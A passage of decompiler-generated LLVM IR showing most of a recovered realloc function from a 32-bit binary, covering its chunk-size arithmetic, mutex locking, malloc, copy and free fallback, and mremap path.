40, 649, 650, 651, 652, 653, 42, 654, 655, 656, 44, 657, 45, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 43, 670, 46, 671, 672, 673, 47, 674, 675, 676, 677, 678, 679, 680, 681, 41, 682, 688, 683, 243, 244, 245, 246, 247, 687, 684, 689, 685, 248, 249, 73, 250, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 49, 48, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 106, 50, 99, 100, 101, 102, 103, 104, 51, 105, 20, 107, 108, 109, 110, 111, 251, 252, 70, 686, 690, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 14, 265, 266, 267, 268, 269, 270, 276, 21, 271, 54, 272, 273, 53, 274, 275, 277, 278, 279, 280, 0, 281, 282, 283, 284, 52, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 1, 296, 297, 55, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 56, 57, 58, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 344, 336, 337, 338, 339, 340, 341, 342, 343, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 112, 113, 114, 115, 116, 117, 118, 120, 119, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 59, 160, 161, 162, 163, 164, 165, 166, 167, 358, 15, 359, 370, 16, 360, 361, 362, 363, 364, 60, 365, 366, 367, 368, 369, 371, 372, 385, 17, 373, 374, 375, 376, 377, 378, 379, 61, 380, 381, 382, 383, 384, 386, 387, 388, 389, 390, 391, 392, 393, 394, 62, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 63, 429, 430, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 168, 169, 170, 171, 64, 172, 173, 65, 174, 175, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 18, 469, 470, 471, 472, 473, 475, 474, 476, 477, 478, 479, 480, 482, 481, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 22, 494, 495, 496, 497, 498, 499, 66, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 67, 517, 518, 519, 520, 521, 522, 523, 524, 525, 527, 526, 528, 529, 530, 531, 532, 534, 533, 535, 536, 537, 538, 539, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 19, 552, 553, 554, 555, 556, 557, 558, 559, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 68, 641, 2, 642, 643, 69 }
  uselistorder i32 160, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_806590b, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8065914 = load i32, i32* @ebp, align 4
  %v0_8065915 = load i32, i32* @edi, align 4
  %v0_8065916 = load i32, i32* @esi, align 4
  %v0_8065917 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_806591f = icmp eq i32* %arg1, null
  %v1_8065924 = icmp eq i1 %v4_806591f, false
  br i1 %v1_8065924, label %dec_label_pc_8065936, label %dec_label_pc_8065926

dec_label_pc_8065926:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_806592a = call i32 @malloc(i32 %arg2)
  store i32 %v1_806592a, i32* %eax.global-to-local, align 4
  store i32 %v1_806592a, i32* @ebx, align 4
  br label %dec_label_pc_8065c2f

dec_label_pc_8065936:                             ; preds = %entry
  %v1_8065936 = icmp eq i32 %arg2, 0
  %v1_8065938 = icmp eq i1 %v1_8065936, false
  br i1 %v1_8065938, label %dec_label_pc_806594b, label %dec_label_pc_806593a

dec_label_pc_806593a:                             ; preds = %dec_label_pc_8065936
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8065941 = call i32 @free(i32 %tmp7)
  store i32 %v1_8065941, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065c2f

dec_label_pc_806594b:                             ; preds = %dec_label_pc_8065936
  %v2_8065956 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8065956, i32* %eax.global-to-local, align 4
  store i32 %v2_8065956, i32* %stack_var_-60, align 4
  %v4_806595b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v4_806595b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8073eb0.683 to i32), i32* %stack_var_-60, align 4
  %v1_8065967 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v1_8065967, i32* %eax.global-to-local, align 4
  %v0_806596f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_806596f, -32
  br i1 %tmp, label %dec_label_pc_8065986, label %dec_label_pc_8065974

dec_label_pc_8065974:                             ; preds = %dec_label_pc_806594b
  %v0_8065974 = load i32, i32* %stack_var_-60, align 4
  %v1_8065974 = call i32 @__errno_location(i32 %v0_8065974)
  store i32 %v1_8065974, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_806597b = inttoptr i32 %v1_8065974 to i32*
  store i32 12, i32* %v1_806597b, align 4
  br label %dec_label_pc_8065c32

dec_label_pc_8065986:                             ; preds = %dec_label_pc_806594b
  %v1_8065986 = add i32 %v0_806596f, 11
  %tmp20 = icmp ult i32 %v1_8065986, 16
  br i1 %tmp20, label %dec_label_pc_806599d, label %dec_label_pc_8065996

dec_label_pc_8065996:                             ; preds = %dec_label_pc_8065986
  %v1_8065996 = and i32 %v1_8065986, -8
  br label %dec_label_pc_806599d

dec_label_pc_806599d:                             ; preds = %dec_label_pc_8065986, %dec_label_pc_8065996
  %stack_var_-40.0 = phi i32 [ %v1_8065996, %dec_label_pc_8065996 ], [ 16, %dec_label_pc_8065986 ]
  %storemerge24 = phi i32 [ %v1_8065996, %dec_label_pc_8065996 ], [ %v1_8065986, %dec_label_pc_8065986 ]
  store i32 %storemerge24, i32* %eax.global-to-local, align 4
  %v1_80659a1 = add i32 %tmp7, -8
  store i32 %v1_80659a1, i32* @edi, align 4
  %v1_80659a4 = add i32 %tmp7, -4
  %v2_80659a4 = inttoptr i32 %v1_80659a4 to i32*
  %v3_80659a4 = load i32, i32* %v2_80659a4, align 4
  store i32 %v3_80659a4, i32* %edx.global-to-local, align 4
  %v1_80659a9 = and i32 %v3_80659a4, -4
  store i32 %v1_80659a9, i32* %eax.global-to-local, align 4
  %v2_80659b0 = and i32 %v3_80659a4, 2
  %v3_80659b0 = icmp eq i32 %v2_80659b0, 0
  %v1_80659b3 = icmp eq i1 %v3_80659b0, false
  br i1 %v1_80659b3, label %dec_label_pc_8065b4d, label %dec_label_pc_80659b9

dec_label_pc_80659b9:                             ; preds = %dec_label_pc_806599d
  store i32 %stack_var_-40.0, i32* @ecx, align 4
  store i32 %v1_80659a9, i32* @ebx, align 4
  %v7_80659bf = icmp ult i32 %v1_80659a9, %stack_var_-40.0
  %v1_80659c1 = icmp eq i1 %v7_80659bf, false
  br i1 %v1_80659c1, label %dec_label_pc_8065af8, label %dec_label_pc_80659c7

dec_label_pc_80659c7:                             ; preds = %dec_label_pc_80659b9
  %v2_80659c7 = add i32 %v1_80659a9, %v1_80659a1
  store i32 %v2_80659c7, i32* @esi, align 4
  %v1_80659ca = load i32, i32* @global_var_807e14c.768, align 4
  %v12_80659ca = icmp eq i32 %v2_80659c7, %v1_80659ca
  %v1_80659d0 = icmp eq i1 %v12_80659ca, false
  %v1_8065a0a = add i32 %v2_80659c7, 4
  %v2_8065a0a = inttoptr i32 %v1_8065a0a to i32*
  %v3_8065a0a = load i32, i32* %v2_8065a0a, align 4
  br i1 %v1_80659d0, label %dec_label_pc_8065a0a, label %dec_label_pc_80659d2

dec_label_pc_80659d2:                             ; preds = %dec_label_pc_80659c7
  %v1_80659d7 = and i32 %v3_8065a0a, -4
  %v2_80659da = add i32 %v1_80659d7, %v1_80659a9
  store i32 %v2_80659da, i32* @ecx, align 4
  %v1_80659e0 = add i32 %stack_var_-40.0, 16
  store i32 %v1_80659e0, i32* %eax.global-to-local, align 4
  %v7_80659e3 = icmp ult i32 %v2_80659da, %v1_80659e0
  br i1 %v7_80659e3, label %dec_label_pc_8065a48, label %dec_label_pc_80659e7

dec_label_pc_80659e7:                             ; preds = %dec_label_pc_80659d2
  %v1_80659e7 = urem i32 %v3_80659a4, 2
  %v5_80659ea = or i32 %v1_80659e7, %stack_var_-40.0
  store i32 %v5_80659ea, i32* %edx.global-to-local, align 4
  store i32 %v5_80659ea, i32* %v2_80659a4, align 4
  %v0_80659f5 = load i32, i32* @ecx, align 4
  %v2_80659f5 = sub i32 %v0_80659f5, %stack_var_-40.0
  %v0_80659f7 = load i32, i32* @edi, align 4
  %v2_80659f7 = add i32 %v0_80659f7, %stack_var_-40.0
  store i32 %v2_80659f7, i32* %eax.global-to-local, align 4
  %v1_80659fa = or i32 %v2_80659f5, 1
  store i32 %v1_80659fa, i32* @ecx, align 4
  store i32 %v2_80659f7, i32* @global_var_807e14c.768, align 4
  %v2_8065a02 = add i32 %v2_80659f7, 4
  %v3_8065a02 = inttoptr i32 %v2_8065a02 to i32*
  store i32 %v1_80659fa, i32* %v3_8065a02, align 4
  br label %dec_label_pc_8065c1d

dec_label_pc_8065a0a:                             ; preds = %dec_label_pc_80659c7
  store i32 %v3_8065a0a, i32* %edx.global-to-local, align 4
  %v1_8065a0f = and i32 %v3_8065a0a, -2
  store i32 %v1_8065a0f, i32* %eax.global-to-local, align 4
  %v3_8065a12 = add i32 %v1_8065a0a, %v1_8065a0f
  %v4_8065a12 = inttoptr i32 %v3_8065a12 to i8*
  %v5_8065a12 = load i8, i8* %v4_8065a12, align 1
  %v6_8065a12 = urem i8 %v5_8065a12, 2
  %v7_8065a12 = icmp eq i8 %v6_8065a12, 0
  %v1_8065a17 = icmp eq i1 %v7_8065a12, false
  br i1 %v1_8065a17, label %dec_label_pc_8065a48, label %dec_label_pc_8065a19

dec_label_pc_8065a19:                             ; preds = %dec_label_pc_8065a0a
  %v1_8065a19 = and i32 %v3_8065a0a, -4
  store i32 %v1_8065a19, i32* %edx.global-to-local, align 4
  %v2_8065a20 = add i32 %v1_8065a19, %v1_80659a9
  store i32 %v2_8065a20, i32* @ebx, align 4
  %v10_8065a22 = icmp ult i32 %v2_8065a20, %stack_var_-40.0
  br i1 %v10_8065a22, label %dec_label_pc_8065a48, label %dec_label_pc_8065a28

dec_label_pc_8065a28:                             ; preds = %dec_label_pc_8065a19
  %v1_8065a28 = add i32 %v1_80659a9, %tmp7
  %v2_8065a28 = inttoptr i32 %v1_8065a28 to i32*
  %v3_8065a28 = load i32, i32* %v2_8065a28, align 4
  store i32 %v3_8065a28, i32* @edx, align 4
  %v1_8065a2b = add i32 %v2_80659c7, 12
  %v2_8065a2b = inttoptr i32 %v1_8065a2b to i32*
  %v3_8065a2b = load i32, i32* %v2_8065a2b, align 4
  store i32 %v3_8065a2b, i32* %eax.global-to-local, align 4
  %v1_8065a2e = add i32 %v3_8065a28, 12
  %v2_8065a2e = inttoptr i32 %v1_8065a2e to i32*
  %v3_8065a2e = load i32, i32* %v2_8065a2e, align 4
  %v15_8065a2e = icmp eq i32 %v3_8065a2e, %v2_80659c7
  %v1_8065a31 = icmp eq i1 %v15_8065a2e, false
  br i1 %v1_8065a31, label %dec_label_pc_8065a38, label %dec_label_pc_8065a33

dec_label_pc_8065a33:                             ; preds = %dec_label_pc_8065a28
  %v1_8065a33 = add i32 %v3_8065a2b, 8
  %v2_8065a33 = inttoptr i32 %v1_8065a33 to i32*
  %v3_8065a33 = load i32, i32* %v2_8065a33, align 4
  %v15_8065a33 = icmp eq i32 %v3_8065a33, %v2_80659c7
  br i1 %v15_8065a33, label %dec_label_pc_8065a3d, label %dec_label_pc_8065a38

dec_label_pc_8065a38:                             ; preds = %dec_label_pc_8065a33, %dec_label_pc_8065a28
  %v0_8065a38 = call i32 @abort()
  store i32 %v0_8065a38, i32* %eax.global-to-local, align 4
  %v1_8065a3d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8065a3d

dec_label_pc_8065a3d:                             ; preds = %dec_label_pc_8065a33, %dec_label_pc_8065a38
  %v1_8065a3d = phi i32 [ %v3_8065a28, %dec_label_pc_8065a33 ], [ %v1_8065a3d.pre, %dec_label_pc_8065a38 ]
  %v0_8065a3d = phi i32 [ %v3_8065a2b, %dec_label_pc_8065a33 ], [ %v0_8065a38, %dec_label_pc_8065a38 ]
  %v2_8065a3d = add i32 %v1_8065a3d, 12
  %v3_8065a3d = inttoptr i32 %v2_8065a3d to i32*
  store i32 %v0_8065a3d, i32* %v3_8065a3d, align 4
  %v0_8065a40 = load i32, i32* @edx, align 4
  %v1_8065a40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065a40 = add i32 %v1_8065a40, 8
  %v3_8065a40 = inttoptr i32 %v2_8065a40 to i32*
  store i32 %v0_8065a40, i32* %v3_8065a40, align 4
  %v0_8065af8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065af8

dec_label_pc_8065a48:                             ; preds = %dec_label_pc_8065a19, %dec_label_pc_8065a0a, %dec_label_pc_80659d2
  %v1_8065a4f = add i32 %stack_var_-40.0, -7
  store i32 %v1_8065a4f, i32* %eax.global-to-local, align 4
  store i32 %v1_8065a4f, i32* %stack_var_-60, align 4
  %v1_8065a53 = call i32 @malloc(i32 %v1_8065a4f)
  store i32 %v1_8065a53, i32* %eax.global-to-local, align 4
  store i32 %v1_8065a53, i32* %edx.global-to-local, align 4
  %v1_8065a5d = icmp eq i32 %v1_8065a53, 0
  br i1 %v1_8065a5d, label %dec_label_pc_8065c19, label %dec_label_pc_8065a65

dec_label_pc_8065a65:                             ; preds = %dec_label_pc_8065a48
  %v1_8065a65 = add i32 %v1_8065a53, -8
  store i32 %v1_8065a65, i32* %ebx.global-to-local, align 4
  %v1_8065a68 = load i32, i32* @esi, align 4
  %v12_8065a68 = icmp eq i32 %v1_8065a65, %v1_8065a68
  %v1_8065a6a = add i32 %v1_8065a53, -4
  %v2_8065a6a = inttoptr i32 %v1_8065a6a to i32*
  %v3_8065a6a = load i32, i32* %v2_8065a6a, align 4
  store i32 %v3_8065a6a, i32* %eax.global-to-local, align 4
  %v1_8065a6d = icmp eq i1 %v12_8065a68, false
  br i1 %v1_8065a6d, label %dec_label_pc_8065a7b, label %dec_label_pc_8065a6f

dec_label_pc_8065a6f:                             ; preds = %dec_label_pc_8065a65
  %v1_8065a6f = and i32 %v3_8065a6a, -4
  store i32 %v1_8065a6f, i32* %eax.global-to-local, align 4
  store i32 %v1_80659a9, i32* %edx.global-to-local, align 4
  %v2_8065a76 = add i32 %v1_8065a6f, %v1_80659a9
  store i32 %v2_8065a76, i32* @ebx, align 4
  br label %dec_label_pc_8065af8

dec_label_pc_8065a7b:                             ; preds = %dec_label_pc_8065a65
  %v1_8065a7f = add i32 %v1_80659a9, -4
  store i32 %v1_8065a7f, i32* %eax.global-to-local, align 4
  %v2_8065a84 = udiv i32 %v1_8065a7f, 4
  store i32 %v2_8065a84, i32* @ecx, align 4
  %tmp25 = icmp ult i32 %v1_8065a7f, 37
  br i1 %tmp25, label %dec_label_pc_8065a9d, label %dec_label_pc_8065a8c

dec_label_pc_8065a8c:                             ; preds = %dec_label_pc_8065a7b
  store i32 %v1_8065a53, i32* %stack_var_-60, align 4
  %v3_8065a93 = inttoptr i32 %v1_8065a53 to i16*
  %v4_8065a93 = call i32 @memcpy(i16* %v3_8065a93, i32 %tmp7, i32 %v1_8065a7f)
  store i32 %v4_8065a93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ae4

dec_label_pc_8065a9d:                             ; preds = %dec_label_pc_8065a7b
  store i32 %tmp7, i32* @esi, align 4
  %v2_8065aa4 = load i32, i32* %arg1, align 4
  store i32 %v2_8065aa4, i32* %eax.global-to-local, align 4
  %v2_8065aa6 = inttoptr i32 %v1_8065a53 to i32*
  store i32 %v2_8065aa4, i32* %v2_8065aa6, align 4
  %v0_8065aa8 = load i32, i32* @esi, align 4
  %v1_8065aa8 = add i32 %v0_8065aa8, 4
  %v2_8065aa8 = inttoptr i32 %v1_8065aa8 to i32*
  %v3_8065aa8 = load i32, i32* %v2_8065aa8, align 4
  store i32 %v3_8065aa8, i32* %eax.global-to-local, align 4
  %v1_8065aab = load i32, i32* %edx.global-to-local, align 4
  %v2_8065aab = add i32 %v1_8065aab, 4
  %v3_8065aab = inttoptr i32 %v2_8065aab to i32*
  store i32 %v3_8065aa8, i32* %v3_8065aab, align 4
  %v0_8065aae = load i32, i32* @esi, align 4
  %v1_8065aae = add i32 %v0_8065aae, 8
  %v2_8065aae = inttoptr i32 %v1_8065aae to i32*
  %v3_8065aae = load i32, i32* %v2_8065aae, align 4
  store i32 %v3_8065aae, i32* %eax.global-to-local, align 4
  %v1_8065ab1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065ab1 = add i32 %v1_8065ab1, 8
  %v3_8065ab1 = inttoptr i32 %v2_8065ab1 to i32*
  store i32 %v3_8065aae, i32* %v3_8065ab1, align 4
  %tmp26 = icmp ult i32 %v1_8065a7f, 17
  br i1 %tmp26, label %dec_label_pc_8065ae4, label %dec_label_pc_8065ab6

dec_label_pc_8065ab6:                             ; preds = %dec_label_pc_8065a9d
  %v0_8065ab6 = load i32, i32* @esi, align 4
  %v1_8065ab6 = add i32 %v0_8065ab6, 12
  %v2_8065ab6 = inttoptr i32 %v1_8065ab6 to i32*
  %v3_8065ab6 = load i32, i32* %v2_8065ab6, align 4
  store i32 %v3_8065ab6, i32* %eax.global-to-local, align 4
  %v0_8065ab9 = load i32, i32* @ecx, align 4
  %v1_8065abc = load i32, i32* %edx.global-to-local, align 4
  %v2_8065abc = add i32 %v1_8065abc, 12
  %v3_8065abc = inttoptr i32 %v2_8065abc to i32*
  store i32 %v3_8065ab6, i32* %v3_8065abc, align 4
  %v0_8065abf = load i32, i32* @esi, align 4
  %v1_8065abf = add i32 %v0_8065abf, 16
  %v2_8065abf = inttoptr i32 %v1_8065abf to i32*
  %v3_8065abf = load i32, i32* %v2_8065abf, align 4
  store i32 %v3_8065abf, i32* %eax.global-to-local, align 4
  %v1_8065ac2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065ac2 = add i32 %v1_8065ac2, 16
  %v3_8065ac2 = inttoptr i32 %v2_8065ac2 to i32*
  store i32 %v3_8065abf, i32* %v3_8065ac2, align 4
  %tmp21 = icmp ult i32 %v0_8065ab9, 7
  br i1 %tmp21, label %dec_label_pc_8065ae4, label %dec_label_pc_8065ac7

dec_label_pc_8065ac7:                             ; preds = %dec_label_pc_8065ab6
  %v0_8065ac7 = load i32, i32* @esi, align 4
  %v1_8065ac7 = add i32 %v0_8065ac7, 20
  %v2_8065ac7 = inttoptr i32 %v1_8065ac7 to i32*
  %v3_8065ac7 = load i32, i32* %v2_8065ac7, align 4
  store i32 %v3_8065ac7, i32* %eax.global-to-local, align 4
  %v0_8065aca = load i32, i32* @ecx, align 4
  %v1_8065acd = load i32, i32* %edx.global-to-local, align 4
  %v2_8065acd = add i32 %v1_8065acd, 20
  %v3_8065acd = inttoptr i32 %v2_8065acd to i32*
  store i32 %v3_8065ac7, i32* %v3_8065acd, align 4
  %v0_8065ad0 = load i32, i32* @esi, align 4
  %v1_8065ad0 = add i32 %v0_8065ad0, 24
  %v2_8065ad0 = inttoptr i32 %v1_8065ad0 to i32*
  %v3_8065ad0 = load i32, i32* %v2_8065ad0, align 4
  store i32 %v3_8065ad0, i32* %eax.global-to-local, align 4
  %v1_8065ad3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065ad3 = add i32 %v1_8065ad3, 24
  %v3_8065ad3 = inttoptr i32 %v2_8065ad3 to i32*
  store i32 %v3_8065ad0, i32* %v3_8065ad3, align 4
  %tmp22 = icmp ult i32 %v0_8065aca, 9
  br i1 %tmp22, label %dec_label_pc_8065ae4, label %dec_label_pc_8065ad8

dec_label_pc_8065ad8:                             ; preds = %dec_label_pc_8065ac7
  %v0_8065ad8 = load i32, i32* @esi, align 4
  %v1_8065ad8 = add i32 %v0_8065ad8, 28
  %v2_8065ad8 = inttoptr i32 %v1_8065ad8 to i32*
  %v3_8065ad8 = load i32, i32* %v2_8065ad8, align 4
  store i32 %v3_8065ad8, i32* %eax.global-to-local, align 4
  %v1_8065adb = load i32, i32* %edx.global-to-local, align 4
  %v2_8065adb = add i32 %v1_8065adb, 28
  %v3_8065adb = inttoptr i32 %v2_8065adb to i32*
  store i32 %v3_8065ad8, i32* %v3_8065adb, align 4
  %v0_8065ade = load i32, i32* @esi, align 4
  %v1_8065ade = add i32 %v0_8065ade, 32
  %v2_8065ade = inttoptr i32 %v1_8065ade to i32*
  %v3_8065ade = load i32, i32* %v2_8065ade, align 4
  store i32 %v3_8065ade, i32* %eax.global-to-local, align 4
  %v1_8065ae1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065ae1 = add i32 %v1_8065ae1, 32
  %v3_8065ae1 = inttoptr i32 %v2_8065ae1 to i32*
  store i32 %v3_8065ade, i32* %v3_8065ae1, align 4
  br label %dec_label_pc_8065ae4

dec_label_pc_8065ae4:                             ; preds = %dec_label_pc_8065ac7, %dec_label_pc_8065ab6, %dec_label_pc_8065a9d, %dec_label_pc_8065a8c, %dec_label_pc_8065ad8
  %v0_8065ae7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8065ae7 = add i32 %v0_8065ae7, 8
  store i32 %v1_8065ae7, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8065aee = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8065c14

dec_label_pc_8065af8:                             ; preds = %dec_label_pc_80659b9, %dec_label_pc_8065a6f, %dec_label_pc_8065a3d
  %v1_8065b09 = phi i32 [ %v1_80659a9, %dec_label_pc_80659b9 ], [ %v2_8065a76, %dec_label_pc_8065a6f ], [ %v0_8065af8.pre, %dec_label_pc_8065a3d ]
  %v5_8065afa = sub i32 %v1_8065b09, %stack_var_-40.0
  store i32 %v5_8065afa, i32* @ecx, align 4
  %tmp23 = icmp ult i32 %v5_8065afa, 16
  br i1 %tmp23, label %dec_label_pc_8065b03, label %dec_label_pc_8065b15

dec_label_pc_8065b03:                             ; preds = %dec_label_pc_8065af8
  %v0_8065b03 = load i32, i32* @edi, align 4
  %v1_8065b03 = add i32 %v0_8065b03, 4
  %v2_8065b03 = inttoptr i32 %v1_8065b03 to i32*
  %v3_8065b03 = load i32, i32* %v2_8065b03, align 4
  %v1_8065b06 = urem i32 %v3_8065b03, 2
  %v2_8065b09 = or i32 %v1_8065b06, %v1_8065b09
  store i32 %v2_8065b09, i32* %eax.global-to-local, align 4
  store i32 %v2_8065b09, i32* %v2_8065b03, align 4
  %v0_8065b0e = load i32, i32* @edi, align 4
  %v1_8065b0e = load i32, i32* @ebx, align 4
  %v2_8065b0e = add i32 %v0_8065b0e, 4
  %v3_8065b0e = add i32 %v2_8065b0e, %v1_8065b0e
  %v4_8065b0e = inttoptr i32 %v3_8065b0e to i32*
  %v5_8065b0e = load i32, i32* %v4_8065b0e, align 4
  %v6_8065b0e = or i32 %v5_8065b0e, 1
  store i32 %v6_8065b0e, i32* %v4_8065b0e, align 4
  br label %dec_label_pc_8065b45

dec_label_pc_8065b15:                             ; preds = %dec_label_pc_8065af8
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8065b19 = load i32, i32* @edi, align 4
  %v2_8065b19 = add i32 %v0_8065b19, %stack_var_-40.0
  store i32 %v2_8065b19, i32* %eax.global-to-local, align 4
  %v1_8065b1c = add i32 %v0_8065b19, 4
  %v2_8065b1c = inttoptr i32 %v1_8065b1c to i32*
  %v3_8065b1c = load i32, i32* %v2_8065b1c, align 4
  %v1_8065b1f = urem i32 %v3_8065b1c, 2
  %v5_8065b22 = or i32 %v1_8065b1f, %stack_var_-40.0
  store i32 %v5_8065b22, i32* %v2_8065b1c, align 4
  %v0_8065b2c = load i32, i32* @ecx, align 4
  %v1_8065b2e = or i32 %v0_8065b2c, 1
  store i32 %v1_8065b2e, i32* %edx.global-to-local, align 4
  %v1_8065b31 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065b31 = add i32 %v1_8065b31, 4
  %v3_8065b31 = inttoptr i32 %v2_8065b31 to i32*
  store i32 %v1_8065b2e, i32* %v3_8065b31, align 4
  %v0_8065b34 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065b34 = load i32, i32* @ecx, align 4
  %v2_8065b34 = add i32 %v0_8065b34, 4
  %v3_8065b34 = add i32 %v2_8065b34, %v1_8065b34
  %v4_8065b34 = inttoptr i32 %v3_8065b34 to i32*
  %v5_8065b34 = load i32, i32* %v4_8065b34, align 4
  %v6_8065b34 = or i32 %v5_8065b34, 1
  store i32 %v6_8065b34, i32* %v4_8065b34, align 4
  %v0_8065b39 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065b39 = add i32 %v0_8065b39, 8
  store i32 %v1_8065b39, i32* %eax.global-to-local, align 4
  store i32 %v1_8065b39, i32* %stack_var_-60, align 4
  %v1_8065b3d = call i32 @free(i32 %v1_8065b39)
  store i32 %v1_8065b3d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065b45

dec_label_pc_8065b45:                             ; preds = %dec_label_pc_8065b03, %dec_label_pc_8065b15
  %v0_8065b45 = load i32, i32* @edi, align 4
  %v1_8065b45 = add i32 %v0_8065b45, 8
  store i32 %v1_8065b45, i32* @ebx, align 4
  br label %dec_label_pc_8065c21

dec_label_pc_8065b4d:                             ; preds = %dec_label_pc_806599d
  store i32 %tmp7, i32* @ecx, align 4
  %v0_8065b51 = load i32, i32* @global_var_807e47c.773, align 4
  %v1_8065b56 = add i32 %v0_8065b51, -1
  store i32 %v1_8065b56, i32* %eax.global-to-local, align 4
  %v2_8065b5b = inttoptr i32 %v1_80659a1 to i32*
  %v3_8065b5b = load i32, i32* %v2_8065b5b, align 4
  store i32 %v3_8065b5b, i32* @ebp, align 4
  %v1_8065b5e = or i32 %stack_var_-40.0, 4
  store i32 %v1_8065b5e, i32* %stack_var_-44, align 4
  %v2_8065b64 = add i32 %v3_8065b5b, %v1_8065b56
  store i32 %v2_8065b64, i32* %edx.global-to-local, align 4
  %v1_8065b67 = sub i32 0, %v0_8065b51
  store i32 %v1_8065b67, i32* %eax.global-to-local, align 4
  %v2_8065b69 = add i32 %v2_8065b64, %v1_8065b5e
  %v2_8065b6c = and i32 %v2_8065b69, %v1_8065b67
  store i32 %v2_8065b6c, i32* @esi, align 4
  %v2_8065b70 = sub i32 %v2_8065b6c, %v3_8065b5b
  store i32 %v2_8065b70, i32* @ebx, align 4
  %v15_8065b72 = icmp eq i32 %v1_80659a9, %v2_8065b70
  br i1 %v15_8065b72, label %dec_label_pc_8065c1d, label %dec_label_pc_8065b7c

dec_label_pc_8065b7c:                             ; preds = %dec_label_pc_8065b4d
  %v2_8065b83 = sub i32 %v1_80659a1, %v3_8065b5b
  store i32 %v2_8065b83, i32* @edi, align 4
  %v2_8065b85 = add i32 %v3_8065b5b, %v1_80659a9
  store i32 %v2_8065b85, i32* %eax.global-to-local, align 4
  store i32 %v2_8065b83, i32* %stack_var_-60, align 4
  %v6_8065b89 = call i32 @mremap(i32 %v2_8065b83, i32 %v2_8065b85, i32 %v2_8065b6c, i32 1, i32 %v1_8065b5e, i32 %v1_80659a9)
  store i32 %v6_8065b89, i32* %eax.global-to-local, align 4
  %v10_8065b91 = icmp eq i32 %v6_8065b89, -1
  br i1 %v10_8065b91, label %dec_label_pc_8065bd5, label %dec_label_pc_8065b96

dec_label_pc_8065b96:                             ; preds = %dec_label_pc_8065b7c
  %v1_8065b96 = load i32, i32* @ebp, align 4
  %v2_8065b96 = add i32 %v1_8065b96, %v6_8065b89
  store i32 %v2_8065b96, i32* %edx.global-to-local, align 4
  %v0_8065b99 = load i32, i32* @ebx, align 4
  %v1_8065b99 = or i32 %v0_8065b99, 2
  store i32 %v1_8065b99, i32* %ebx.global-to-local, align 4
  %v0_8065b9c = load i32, i32* @esi, align 4
  store i32 %v0_8065b9c, i32* %eax.global-to-local, align 4
  %v2_8065b9e = add i32 %v2_8065b96, 4
  %v3_8065b9e = inttoptr i32 %v2_8065b9e to i32*
  store i32 %v1_8065b99, i32* %v3_8065b9e, align 4
  %v0_8065ba1 = load i32, i32* %eax.global-to-local, align 4
  %v5_8065ba1 = sub i32 %v0_8065ba1, %v1_80659a9
  %v1_8065ba5 = load i32, i32* @global_var_807e484.778, align 4
  %v2_8065ba5 = add i32 %v1_8065ba5, %v5_8065ba1
